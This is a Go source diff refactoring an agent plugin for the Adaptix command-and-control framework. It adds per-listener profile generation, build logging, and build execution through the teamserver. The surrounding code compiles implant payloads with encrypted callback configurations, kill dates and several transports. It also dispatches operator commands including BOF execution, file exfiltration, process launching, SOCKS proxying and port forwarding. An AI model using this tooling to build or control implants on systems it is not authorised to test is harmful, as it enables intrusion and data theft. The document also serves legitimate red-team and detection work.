@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bytes"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -9,57 +8,15 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	mrand "math/rand"
 	"math/rand/v2"
 	"net"
 	"os"
-	"os/exec"
 	"sort"
 	"strconv"
 	"strings"
 	"time"
 
 	"github.com/Adaptix-Framework/axc2"
-)
-
-const (
-	OS_UNKNOWN = 0
-	OS_WINDOWS = 1
-	OS_LINUX   = 2
-	OS_MAC     = 3
-
-	TYPE_TASK       = 1
-	TYPE_BROWSER    = 2
-	TYPE_JOB        = 3
-	TYPE_TUNNEL     = 4
-	TYPE_PROXY_DATA = 5
-
-	MESSAGE_INFO    = 5
-	MESSAGE_ERROR   = 6
-	MESSAGE_SUCCESS = 7
-
-	DOWNLOAD_STATE_RUNNING  = 1
-	DOWNLOAD_STATE_STOPPED  = 2
-	DOWNLOAD_STATE_FINISHED = 3
-	DOWNLOAD_STATE_CANCELED = 4
-
-	TUNNEL_TYPE_SOCKS4     = 1
-	TUNNEL_TYPE_SOCKS5     = 2
-	TUNNEL_TYPE_LOCAL_PORT = 4
-	TUNNEL_TYPE_REVERSE    = 5
-
-	ADDRESS_TYPE_IPV4   = 1
-	ADDRESS_TYPE_DOMAIN = 3
-	ADDRESS_TYPE_IPV6   = 4
-
-	SOCKS5_SERVER_FAILURE          byte = 1
-	SOCKS5_NOT_ALLOWED_RULESET     byte = 2
-	SOCKS5_NETWORK_UNREACHABLE     byte = 3
-	SOCKS5_HOST_UNREACHABLE        byte = 4
-	SOCKS5_CONNECTION_REFUSED      byte = 5
-	SOCKS5_TTL_EXPIRED             byte = 6
-	SOCKS5_COMMAND_NOT_SUPPORTED   byte = 7
-	SOCKS5_ADDR_TYPE_NOT_SUPPORTED byte = 8
 )
 
 type Teamserver interface {
@@ -70,6 +27,9 @@ type Teamserver interface {
 	TsAgentUpdateData(newAgentData adaptix.AgentData) error
 	TsAgentTerminate(agentId string, terminateTaskId string) error
 	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error
+
+	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
+	TsAgentBuildLog(builderId string, status int, message string) error
 
 	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
 
@@ -141,8 +101,12 @@ func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent 
 	return &PluginAgent{}
 }
 
+func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
+	return &ExtenderAgent{}
+}
+
 func makeProxyTask(packData []byte) adaptix.TaskData {
-	return adaptix.TaskData{Type: TYPE_PROXY_DATA, Data: packData, Sync: false}
+	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
 }
 
 func getStringArg(args map[string]any, key string) (string, error) {
@@ -305,190 +269,196 @@ var (
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
-func (p *PluginAgent) GenerateConfig(config string, listenerWM string, listenerProfile []byte) ([]byte, error) {
-	var (
-		listenerMap   map[string]any
-		payloadConfig []byte
-	)
+func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
+	var agentProfiles [][]byte
 
-	if err := json.Unmarshal(listenerProfile, &listenerMap); err != nil {
-		return nil, err
+	for _, transportProfile := range profile.ListenerProfiles {
+
+		var listenerMap map[string]any
+		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
+			return nil, err
+		}
+
+		/// START CODE HERE
+
+		var (
+			generateConfig GenerateConfig
+			params         []interface{}
+		)
+
+		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
+		if err != nil {
+			return nil, err
+		}
+
+		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
+		if err != nil {
+			return nil, err
+		}
+
+		kill_date := 0
+		if generateConfig.IsKillDate {
+			dt := generateConfig.Killdate + " " + generateConfig.Killtime
+			t, err := time.Parse("02.01.2006 15:04:05", dt)
+			if err != nil {
+				err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
+				return nil, err
+			}
+			kill_date = int(t.Unix())
+		}
+
+		working_time := 0
+		if generateConfig.IsWorkingTime {
+			t := generateConfig.StartTime + "-" + generateConfig.EndTime
+			working_time, err = parseStringToWorkingTime(t)
+			if err != nil {
+				return nil, err
+			}
+		}
+
+		encrypt_key, _ := listenerMap["encrypt_key"].(string)
+		encryptKey, err := hex.DecodeString(encrypt_key)
+		if err != nil {
+			return nil, err
+		}
+
+		protocol, _ := listenerMap["protocol"].(string)
+		switch protocol {
+
+		case "http":
+
+			var Hosts []string
+			var Ports []int
+			hosts_agent, _ := listenerMap["callback_addresses"].(string)
+			lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
+			for _, line := range lines {
+				line = strings.TrimSpace(line)
+				if line == "" {
+					continue
+				}
+
+				host, portStr, _ := net.SplitHostPort(line)
+				port, _ := strconv.Atoi(portStr)
+
+				Hosts = append(Hosts, host)
+				Ports = append(Ports, port)
+			}
+			c2Count := len(Hosts)
+
+			HttpMethod, _ := listenerMap["http_method"].(string)
+			Ssl, _ := listenerMap["ssl"].(bool)
+			Uri, _ := listenerMap["uri"].(string)
+			ParameterName, _ := listenerMap["hb_header"].(string)
+			UserAgent, _ := listenerMap["user_agent"].(string)
+			RequestHeaders, _ := listenerMap["request_headers"].(string)
+
+			WebPageOutput, _ := listenerMap["page-payload"].(string)
+			ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
+			ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
+
+			seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+			if err != nil {
+				return nil, err
+			}
+
+			params = append(params, int(agentWatermark))
+			params = append(params, Ssl)
+			params = append(params, c2Count)
+			for i := 0; i < c2Count; i++ {
+				params = append(params, Hosts[i])
+				params = append(params, Ports[i])
+			}
+			params = append(params, HttpMethod)
+			params = append(params, Uri)
+			params = append(params, ParameterName)
+			params = append(params, UserAgent)
+			params = append(params, RequestHeaders)
+			params = append(params, ansOffset1)
+			params = append(params, ansOffset2)
+			params = append(params, kill_date)
+			params = append(params, working_time)
+			params = append(params, seconds)
+			params = append(params, generateConfig.Jitter)
+
+		case "bind_smb":
+
+			pipename, _ := listenerMap["pipename"].(string)
+			pipename = "\\\\.\\pipe\\" + pipename
+
+			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
+
+			params = append(params, int(agentWatermark))
+			params = append(params, pipename)
+			params = append(params, int(lWatermark))
+			params = append(params, kill_date)
+
+		case "bind_tcp":
+			prepend, _ := listenerMap["prepend_data"].(string)
+			port, _ := listenerMap["port_bind"].(float64)
+
+			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
+
+			params = append(params, int(agentWatermark))
+			params = append(params, prepend)
+			params = append(params, int(port))
+			params = append(params, int(lWatermark))
+			params = append(params, kill_date)
+
+		case "dns":
+			params, err = buildDNSProfileParams(generateConfig, listenerMap, transportProfile.Watermark, agentWatermark, kill_date, working_time)
+			if err != nil {
+				return nil, err
+			}
+
+		default:
+			return nil, errors.New("protocol unknown")
+		}
+
+		packedParams, err := PackArray(params)
+		if err != nil {
+			return nil, err
+		}
+
+		cryptParams, err := RC4Crypt(packedParams, encryptKey)
+		if err != nil {
+			return nil, err
+		}
+
+		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
+		packedProfile, err := PackArray(profileArray)
+		if err != nil {
+			return nil, err
+		}
+
+		profileString := ""
+		for _, b := range packedProfile {
+			profileString += fmt.Sprintf("\\x%02x", b)
+		}
+		agentProfiles = append(agentProfiles, []byte(profileString))
+
+		/// END CODE HERE
 	}
+	return agentProfiles, nil
+}
+
+func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
+	var (
+		Filename string
+		Payload  []byte
+	)
 
 	/// START CODE HERE
 
-	var (
-		generateConfig GenerateConfig
-		params         []interface{}
-	)
-
-	err := json.Unmarshal([]byte(config), &generateConfig)
-	if err != nil {
-		return nil, err
+	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
+		return nil, "", errors.New("only one listener profile is supported")
 	}
+	listenerProfile := profile.ListenerProfiles[0].Profile
+	agentProfile := agentProfiles[0]
 
-	agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
-	if err != nil {
-		return nil, err
-	}
-
-	kill_date := 0
-	if generateConfig.IsKillDate {
-		dt := generateConfig.Killdate + " " + generateConfig.Killtime
-		t, err := time.Parse("02.01.2006 15:04:05", dt)
-		if err != nil {
-			err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
-			return nil, err
-		}
-		kill_date = int(t.Unix())
-	}
-
-	working_time := 0
-	if generateConfig.IsWorkingTime {
-		t := generateConfig.StartTime + "-" + generateConfig.EndTime
-		working_time, err = parseStringToWorkingTime(t)
-		if err != nil {
-			return nil, err
-		}
-	}
-
-	encrypt_key, _ := listenerMap["encrypt_key"].(string)
-	encryptKey, err := hex.DecodeString(encrypt_key)
-	if err != nil {
-		return nil, err
-	}
-
-	protocol, _ := listenerMap["protocol"].(string)
-	switch protocol {
-
-	case "http":
-
-		var Hosts []string
-		var Ports []int
-		hosts_agent, _ := listenerMap["callback_addresses"].(string)
-		lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
-		for _, line := range lines {
-			line = strings.TrimSpace(line)
-			if line == "" {
-				continue
-			}
-
-			host, portStr, _ := net.SplitHostPort(line)
-			port, _ := strconv.Atoi(portStr)
-
-			Hosts = append(Hosts, host)
-			Ports = append(Ports, port)
-		}
-		c2Count := len(Hosts)
-
-		HttpMethod, _ := listenerMap["http_method"].(string)
-		Ssl, _ := listenerMap["ssl"].(bool)
-		Uri, _ := listenerMap["uri"].(string)
-		ParameterName, _ := listenerMap["hb_header"].(string)
-		UserAgent, _ := listenerMap["user_agent"].(string)
-		RequestHeaders, _ := listenerMap["request_headers"].(string)
-
-		WebPageOutput, _ := listenerMap["page-payload"].(string)
-		ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
-		ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
-
-		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
-		if err != nil {
-			return nil, err
-		}
-
-		params = append(params, int(agentWatermark))
-		params = append(params, Ssl)
-		params = append(params, c2Count)
-		for i := 0; i < c2Count; i++ {
-			params = append(params, Hosts[i])
-			params = append(params, Ports[i])
-		}
-		params = append(params, HttpMethod)
-		params = append(params, Uri)
-		params = append(params, ParameterName)
-		params = append(params, UserAgent)
-		params = append(params, RequestHeaders)
-		params = append(params, ansOffset1)
-		params = append(params, ansOffset2)
-		params = append(params, kill_date)
-		params = append(params, working_time)
-		params = append(params, seconds)
-		params = append(params, generateConfig.Jitter)
-
-	case "bind_smb":
-
-		pipename, _ := listenerMap["pipename"].(string)
-		pipename = "\\\\.\\pipe\\" + pipename
-
-		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
-
-		params = append(params, int(agentWatermark))
-		params = append(params, pipename)
-		params = append(params, int(lWatermark))
-		params = append(params, kill_date)
-
-	case "bind_tcp":
-		prepend, _ := listenerMap["prepend_data"].(string)
-		port, _ := listenerMap["port_bind"].(float64)
-
-		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
-
-		params = append(params, int(agentWatermark))
-		params = append(params, prepend)
-		params = append(params, int(port))
-		params = append(params, int(lWatermark))
-		params = append(params, kill_date)
-
-	case "dns":
-		params, err = buildDNSProfileParams(generateConfig, listenerMap, listenerWM, agentWatermark, kill_date, working_time)
-		if err != nil {
-			return nil, err
-		}
-
-	default:
-		return nil, errors.New("protocol unknown")
-	}
-
-	packedParams, err := PackArray(params)
-	if err != nil {
-		return nil, err
-	}
-
-	cryptParams, err := RC4Crypt(packedParams, encryptKey)
-	if err != nil {
-		return nil, err
-	}
-
-	profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
-	packedProfile, err := PackArray(profileArray)
-	if err != nil {
-		return nil, err
-	}
-
-	profileString := ""
-	for _, b := range packedProfile {
-		profileString += fmt.Sprintf("\\x%02x", b)
-	}
-	payloadConfig = []byte(profileString)
-
-	/// END CODE HERE
-
-	return payloadConfig, nil
-}
-
-func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, listenerProfile []byte) ([]byte, string, error) {
-	var (
-		listenerMap map[string]any
-		Filename    string
-		Payload     []byte
-	)
-
+	var listenerMap map[string]any
 	if err := json.Unmarshal(listenerProfile, &listenerMap); err != nil {
 		return nil, "", err
 	}
-
-	/// START CODE HERE
 
 	var (
 		generateConfig GenerateConfig
@@ -499,14 +469,12 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 		stubPath       string
 		buildPath      string
 		cmdConfig      string
-		stdout         bytes.Buffer
-		stderr         bytes.Buffer
 	)
 
 	cFlags := CFlags
 	lFlags := LFlags
 
-	err := json.Unmarshal([]byte(agentConfig), &generateConfig)
+	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
 	if err != nil {
 		return nil, "", err
 	}
@@ -533,6 +501,7 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: %s", protocol, ConnectorFile))
 
 	if generateConfig.Arch == "x86" {
 		Compiler = "i686-w64-mingw32-g++"
@@ -557,15 +526,16 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 	} else {
 		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, string(agentProfile), agentProfileSize, tempDir)
 	}
-	runnerCmdConfig := exec.Command("sh", "-c", cmdConfig)
-	runnerCmdConfig.Dir = currentDir
-	runnerCmdConfig.Stdout = &stdout
-	runnerCmdConfig.Stderr = &stderr
-	err = runnerCmdConfig.Run()
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")
+
+	var buildArgsConfig []string
+	buildArgsConfig = append(buildArgsConfig, "-c", cmdConfig)
+	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", buildArgsConfig...)
 	if err != nil {
 		_ = os.RemoveAll(tempDir)
-		return nil, "", errors.New(string(stderr.Bytes()))
+		return nil, "", err
 	}
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")
 
 	Files := tempDir + "/config.o "
 	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
@@ -609,16 +579,18 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 		_ = os.RemoveAll(tempDir)
 		return nil, "", errors.New("unknown file format")
 	}
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")
 
-	cmdBuild := fmt.Sprintf("%s %s %s -o %s", Compiler, lFlags, Files, buildPath)
-	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
-	runnerCmdBuild.Dir = currentDir
-	runnerCmdBuild.Stdout = &stdout
-	runnerCmdBuild.Stderr = &stderr
-	err = runnerCmdBuild.Run()
+	var buildArgs []string
+	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
+	buildArgs = append(buildArgs, strings.Fields(Files)...)
+	buildArgs = append(buildArgs, "-o", buildPath)
+
+	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
 	if err != nil {
 		_ = os.RemoveAll(tempDir)
-		return nil, "", fmt.Errorf("%v: %s", err, stderr.String())
+		return nil, "", err
 	}
 
 	buildContent, err := os.ReadFile(buildPath)
@@ -633,10 +605,10 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 			return nil, "", err
 		}
 		Payload = append(stubContent, buildContent...)
-
 	} else {
 		Payload = buildContent
 	}
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))
 
 	/// END CODE HERE
 
@@ -767,8 +739,8 @@ func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.Ta
 	/// END CODE
 
 	taskData := adaptix.TaskData{
-		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
-		Type:   TYPE_PROXY_DATA,
+		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
+		Type:   adaptix.TASK_TYPE_PROXY_DATA,
 		Data:   packData,
 		Sync:   false,
 	}
@@ -790,12 +762,12 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 	subcommand, _ := args["subcommand"].(string)
 
 	taskData = adaptix.TaskData{
-		Type: TYPE_TASK,
+		Type: adaptix.TASK_TYPE_TASK,
 		Sync: true,
 	}
 
 	messageData = adaptix.ConsoleMessageData{
-		Status: MESSAGE_INFO,
+		Status: adaptix.MESSAGE_INFO,
 		Text:   "",
 	}
 	messageData.Message, _ = args["message"].(string)
@@ -843,7 +815,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 	case "execute":
 		if subcommand == "bof" {
-			taskData.Type = TYPE_JOB
+			taskData.Type = adaptix.TASK_TYPE_JOB
 
 			bofFile, err := getStringArg(args, "bof")
 			if err != nil {
@@ -883,11 +855,11 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		}
 
 		if subcommand == "cancel" {
-			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_CANCELED, int(fileId)}
+			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_CANCELED, int(fileId)}
 		} else if subcommand == "stop" {
-			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_STOPPED, int(fileId)}
+			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_STOPPED, int(fileId)}
 		} else if subcommand == "start" {
-			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_RUNNING, int(fileId)}
+			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_RUNNING, int(fileId)}
 		} else {
 			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
 			goto RET
@@ -959,7 +931,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(dir, agentData.ACP)}
 
 	case "lportfwd":
-		taskData.Type = TYPE_TUNNEL
+		taskData.Type = adaptix.TASK_TYPE_TUNNEL
 
 		lportNumber, _ := getFloatArg(args, "lport")
 		lport := int(lportNumber)
@@ -994,7 +966,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			}
 
 			taskData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
-			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
 			taskData.ClearText = "\n"
 
 		} else if subcommand == "stop" {
@@ -1003,7 +975,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			Ts.TsTunnelStopLportfwd(agentData.Id, lport)
 
 			taskData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
-			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
 			taskData.ClearText = "\n"
 
 		} else {
@@ -1087,7 +1059,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			array = []interface{}{COMMAND_PS_KILL, int(pid)}
 
 		} else if subcommand == "run" {
-			taskData.Type = TYPE_JOB
+			taskData.Type = adaptix.TASK_TYPE_JOB
 
 			output := getBoolArg(args, "-o")
 			suspend := getBoolArg(args, "-s")
@@ -1119,7 +1091,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		array = []interface{}{COMMAND_RM, Ts.TsConvertUTF8toCp(path, agentData.ACP)}
 
 	case "rportfwd":
-		taskData.Type = TYPE_TUNNEL
+		taskData.Type = adaptix.TASK_TYPE_TUNNEL
 
 		lportNumber, _ := getFloatArg(args, "lport")
 		lport := int(lportNumber)
@@ -1150,14 +1122,14 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			}
 
 			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
-			messageData.Status = MESSAGE_INFO
+			messageData.Status = adaptix.MESSAGE_INFO
 
 		} else if subcommand == "stop" {
 			taskData.Completed = true
 
 			Ts.TsTunnelStopRportfwd(agentData.Id, lport)
 
-			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
 			taskData.Message = "Reverse port forwarding has been stopped"
 
 		} else {
@@ -1244,7 +1216,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		}
 
 	case "socks":
-		taskData.Type = TYPE_TUNNEL
+		taskData.Type = adaptix.TASK_TYPE_TUNNEL
 
 		portNumber, err := getFloatArg(args, "port")
 		port := int(portNumber)
@@ -1306,7 +1278,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 					taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
 				}
 			}
-			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
 			taskData.ClearText = "\n"
 
 		} else if subcommand == "stop" {
@@ -1314,7 +1286,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 			Ts.TsTunnelStopSocks(agentData.Id, port)
 
-			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
 			taskData.Message = "Socks5 server has been stopped"
 			taskData.ClearText = "\n"
 
@@ -1385,10 +1357,10 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 	var outTasks []adaptix.TaskData
 
 	taskData := adaptix.TaskData{
-		Type:        TYPE_TASK,
+		Type:        adaptix.TASK_TYPE_TASK,
 		AgentId:     agentData.Id,
 		FinishDate:  time.Now().Unix(),
-		MessageType: MESSAGE_SUCCESS,
+		MessageType: adaptix.MESSAGE_SUCCESS,
 		Completed:   true,
 		Sync:        true,
 	}
@@ -1453,7 +1425,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			if result == 0 {
 				errorCode := packer.ParseInt32()
 				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 
 			} else {
 				drivesCount := int(packer.ParseInt32())
@@ -1515,12 +1487,12 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				fileContent := packer.ParseBytes()
 				task.Completed = false
-				_ = Ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, fileContent)
+				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, fileContent)
 				continue
 
 			} else if downloadCommand == DOWNLOAD_FINISH {
 				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
-				_ = Ts.TsDownloadClose(fileId, DOWNLOAD_STATE_FINISHED)
+				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_FINISHED)
 			}
 
 		case COMMAND_EXFIL:
@@ -1530,17 +1502,17 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
 			downloadState := packer.ParseInt8()
 
-			if downloadState == DOWNLOAD_STATE_STOPPED {
+			if downloadState == adaptix.DOWNLOAD_STATE_STOPPED {
 				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
-				_ = Ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_STOPPED, []byte(""))
+				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_STOPPED, []byte(""))
 
-			} else if downloadState == DOWNLOAD_STATE_RUNNING {
+			} else if downloadState == adaptix.DOWNLOAD_STATE_RUNNING {
 				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
-				_ = Ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, []byte(""))
+				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, []byte(""))
 
-			} else if downloadState == DOWNLOAD_STATE_CANCELED {
+			} else if downloadState == adaptix.DOWNLOAD_STATE_CANCELED {
 				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
-				_ = Ts.TsDownloadClose(fileId, DOWNLOAD_STATE_CANCELED)
+				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_CANCELED)
 			}
 
 		case COMMAND_EXEC_BOF:
@@ -1559,7 +1531,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				_ = packer.ParseString()
 
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 				task.Message = "BOF error"
 				task.ClearText = "Parse BOF error"
 
@@ -1569,7 +1541,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				_ = packer.ParseString()
 
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 				task.Message = "BOF error"
 				task.ClearText = "The number of functions in the BOF file exceeds 512"
 
@@ -1579,7 +1551,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				_ = packer.ParseString()
 
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 				task.Message = "BOF error"
 				task.ClearText = "Entry function not found"
 
@@ -1589,7 +1561,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				_ = packer.ParseString()
 
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 				task.Message = "BOF error"
 				task.ClearText = "Error allocation of BOF memory"
 
@@ -1599,7 +1571,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				output := packer.ParseString()
 
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 				task.Message = "BOF error"
 				task.ClearText = "Symbol not found: " + output + "\n"
 
@@ -1609,7 +1581,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				output := packer.ParseString()
 
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 				task.Message = "BOF output"
 				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP)
 
@@ -1627,7 +1599,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 					task.Message = "BOF output"
 				}
 
-				task.MessageType = MESSAGE_SUCCESS
+				task.MessageType = adaptix.MESSAGE_SUCCESS
 				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.OemCP)
 
 			} else if outputType == CALLBACK_OUTPUT_UTF8 {
@@ -1644,7 +1616,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 					task.Message = "BOF output"
 				}
 
-				task.MessageType = MESSAGE_SUCCESS
+				task.MessageType = adaptix.MESSAGE_SUCCESS
 				task.ClearText = output
 
 			} else if outputType == CALLBACK_AX_SCREENSHOT {
@@ -1680,7 +1652,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 					task.Message = "BOF output"
 				}
 
-				task.MessageType = MESSAGE_SUCCESS
+				task.MessageType = adaptix.MESSAGE_SUCCESS
 				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP) + "\n"
 			}
 
@@ -1751,7 +1723,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 					task.ClearText = jobOutput
 				} else if state == JOB_STATE_KILLED {
 					task.Completed = true
-					task.MessageType = MESSAGE_INFO
+					task.MessageType = adaptix.MESSAGE_INFO
 					task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
 				} else if state == JOB_STATE_FINISHED {
 					task.Completed = true
@@ -1803,7 +1775,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			jobId := packer.ParseInt32()
 
 			if result == 0 {
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 				task.Message = fmt.Sprintf("Job %v not found", jobId)
 			} else {
 				task.Message = fmt.Sprintf("Job %v mark as Killed", jobId)
@@ -1823,10 +1795,10 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 			if linkType == 1 {
 				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
